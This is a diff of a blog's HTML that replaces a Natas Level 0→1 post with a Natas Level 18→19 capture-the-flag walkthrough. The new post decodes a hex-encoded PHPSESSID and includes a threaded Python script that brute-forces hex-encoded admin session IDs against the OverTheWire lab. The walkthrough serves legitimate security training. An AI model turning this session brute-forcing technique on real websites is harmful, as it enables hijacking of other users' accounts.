@@ -6,31 +6,31 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
 
-    <meta name="description" content="We'll I guess that secures things">
+    <meta name="description" content="What the hex?">
 
     <link rel="shortcut icon" href="/favicon.ico?" type="image/x-icon">
     <link rel="icon" href="/favicon.ico?" type="image/x-icon">
     <link rel="stylesheet" href="https://cdnjs.Cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
     <link rel="stylesheet" href="/assets/css/main.min.css ">
-    <link rel="canonical" href="/2021/05/23/natas00-01/">
+    <link rel="canonical" href="/2021/05/29/natas18-19/">
     <link rel="alternate" type="application/rss+xml" title="Caminek" href="/feed.xml ">
     
     <!-- Begin Jekyll SEO tag v2.7.1 -->
-<title>Natas Level 0 → Level 1 | Caminek</title>
+<title>Natas Level 18 → Level 19 | Caminek</title>
 <meta name="generator" content="Jekyll v4.2.0" />
-<meta property="og:title" content="Natas Level 0 → Level 1" />
+<meta property="og:title" content="Natas Level 18 → Level 19" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="We’ll I guess that secures things" />
-<meta property="og:description" content="We’ll I guess that secures things" />
-<link rel="canonical" href="/2021/05/23/natas00-01/" />
-<meta property="og:url" content="/2021/05/23/natas00-01/" />
+<meta name="description" content="What the hex?" />
+<meta property="og:description" content="What the hex?" />
+<link rel="canonical" href="/2021/05/29/natas18-19/" />
+<meta property="og:url" content="/2021/05/29/natas18-19/" />
 <meta property="og:site_name" content="Caminek" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2021-05-23T15:04:25-04:00" />
+<meta property="article:published_time" content="2021-05-29T16:55:52-04:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="Natas Level 0 → Level 1" />
+<meta property="twitter:title" content="Natas Level 18 → Level 19" />
 <script type="application/ld+json">
-{"@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/2021/05/23/natas00-01/"},"description":"We’ll I guess that secures things","headline":"Natas Level 0 → Level 1","dateModified":"2021-05-23T15:04:25-04:00","url":"/2021/05/23/natas00-01/","datePublished":"2021-05-23T15:04:25-04:00","@context":"https://schema.org"}</script>
+{"@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/2021/05/29/natas18-19/"},"description":"What the hex?","headline":"Natas Level 18 → Level 19","dateModified":"2021-05-29T16:55:52-04:00","url":"/2021/05/29/natas18-19/","datePublished":"2021-05-29T16:55:52-04:00","@context":"https://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 
 
@@ -142,11 +142,11 @@
 
         <div class="page clearfix" index>
     <div class="left">
-        <h1>Natas Level 0 → Level 1</h1>
+        <h1>Natas Level 18 → Level 19</h1>
         <div class="label">
 
             <div class="label-card">
-                <i class="fa fa-calendar"></i> 2021-05-23
+                <i class="fa fa-calendar"></i> 2021-05-29
             </div>
 
             <div class="label-card">
@@ -212,20 +212,46 @@
 <p>Excluding the URL and username, the Level Goal section is blank for the Natas ctf.</p>
 
 <h2 id="solution">Solution</h2>
-<p>Right clicking the webpage has been disabled. In Firefox, you can view the source using the following url:
-<a href="view-source:http://natas1.natas.labs.overthewire.org/">view-source:http://natas1.natas.labs.overthewire.org/</a></p>
+<p>The natas19 site tells us that the site is nearly identical to the the previous level, and that session ids are no longer sequential. There is no source code to view.</p>
 
-<p>The password is once again in a comment.</p>
+<p>Let’s start opening the Developer Tools, clicking on Storage and then entering some random data into the username and password fields.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;"&gt;
-&lt;h1&gt;natas1&lt;/h1&gt;
-&lt;div id="content"&gt;
-You can find the password for the
-next level on this page, but rightclicking has been blocked!
+<p>We now have a much longer value for PHPSESSID. Here’s the value I received:</p>
 
-&lt;!--The password for natas2 is Z------------------------------i --&gt;
-&lt;/div&gt;
-&lt;/body&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3335362d6e617461733230
+</code></pre></div></div>
+
+<p>My first thought is the value appears to be hexadecimal. Let’s treat it as such and attempt to decode it. While there are plenty of tools to decode base64, I opted to use <a href="https://gchq.github.io/CyberChef">CyberChef</a>. Feel free to use any utility you want to decode the value.</p>
+
+<p>CyberChef returned <strong>356-natas20</strong>. This looks like the PHPSESSID is now made up of a random number, followed by a dash, followed by the username entered into the form.</p>
+
+<p>Let’s update our script from the last level.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">requests.auth</span> <span class="kn">import</span> <span class="n">HTTPBasicAuth</span>
+<span class="kn">import</span> <span class="nn">concurrent.futures</span>
+
+<span class="n">natas19_password</span> <span class="o">=</span> <span class="s">'4------------------------------s'</span>
+<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">get_phpsessid</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
+    <span class="n">raw_id</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">id</span><span class="p">)</span> <span class="o">+</span> <span class="s">"-admin"</span>
+    <span class="n">enc_id</span> <span class="o">=</span> <span class="n">raw_id</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">).</span><span class="nb">hex</span><span class="p">()</span>
+
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://natas19.natas.labs.overthewire.org/index.php'</span><span class="p">,</span>
+                        <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s">"PHPSESSID"</span><span class="p">:</span> <span class="n">enc_id</span><span class="p">},</span>
+                        <span class="n">auth</span><span class="o">=</span><span class="n">HTTPBasicAuth</span><span class="p">(</span><span class="s">'natas19'</span><span class="p">,</span> <span class="n">natas19_password</span><span class="p">))</span>
+
+    <span class="k">if</span> <span class="s">"You are logged in as a regular user"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'The admin id is </span><span class="si">{</span><span class="nb">id</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+        <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+
+<span class="k">with</span> <span class="n">concurrent</span><span class="p">.</span><span class="n">futures</span><span class="p">.</span><span class="n">ThreadPoolExecutor</span><span class="p">()</span> <span class="k">as</span> <span class="n">executor</span><span class="p">:</span>
+    <span class="n">executor</span><span class="p">.</span><span class="nb">map</span><span class="p">(</span><span class="n">get_phpsessid</span><span class="p">,</span> <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">641</span><span class="p">)))</span>
 </code></pre></div></div>
 
         </article>
@@ -235,12 +261,10 @@ next level on this page, but rightclicking has been blocked!
         <div class="post-recent">
     <div class="pre" style="display:inline-block; margin-top: 20px;">
         
-        <p><i class="fa fa-arrow-left"></i> <a href="/2021/05/23/natas00/">Natas Level 0</a></p>
+        <p><i class="fa fa-arrow-left"></i> <a href="/2021/05/29/natas17-18/">Natas Level 17 → Level 18</a></p>
         
     </div>
     <div class="nex" style="display:inline-block; margin-top: 20px; float:right;">
-        
-        <p><a href="/2021/05/23/natas01-02/">Natas Level 1 → Level 2</a> <i class="fa fa-arrow-right"></i></p>
         
     </div>
 </div>
@@ -281,82 +305,82 @@ next level on this page, but rightclicking has been blocked!
                         
 
                         
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
-                    
-                        
-
-                        
                             
 
                             <!-- prevent Series from showing < 5 entries when near the end of series -->
                             
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
+                        
+                    
+                        
+
                         
                     
                         
@@ -567,7 +591,7 @@ next level on this page, but rightclicking has been blocked!
                         
                             <li>
                                 
-                                    <a href="/2021/05/23/natas00/">Natas Level 0</a>
+                                    <a href="/2021/05/27/natas14-15/">Natas Level 14 → Level 15</a>
                                 
                             </li>
                         
@@ -575,7 +599,7 @@ next level on this page, but rightclicking has been blocked!
                         
                             <li>
                                 
-                                    <strong>Natas Level 0 → Level 1</strong>
+                                    <a href="/2021/05/28/natas15-16/">Natas Level 15 → Level 16</a>
                                 
                             </li>
                         
@@ -583,7 +607,7 @@ next level on this page, but rightclicking has been blocked!
                         
                             <li>
                                 
-                                    <a href="/2021/05/23/natas01-02/">Natas Level 1 → Level 2</a>
+                                    <a href="/2021/05/28/natas16-17/">Natas Level 16 → Level 17</a>
                                 
                             </li>
                         
@@ -591,7 +615,7 @@ next level on this page, but rightclicking has been blocked!
                         
                             <li>
                                 
-                                    <a href="/2021/05/23/natas02-03/">Natas Level 2 → Level 3</a>
+                                    <a href="/2021/05/29/natas17-18/">Natas Level 17 → Level 18</a>
                                 
                             </li>
                         
@@ -599,7 +623,7 @@ next level on this page, but rightclicking has been blocked!
                         
                             <li>
                                 
-                                    <a href="/2021/05/23/natas03-04/">Natas Level 3 → Level 4</a>
+                                    <strong>Natas Level 18 → Level 19</strong>
                                 
                             </li>
                         
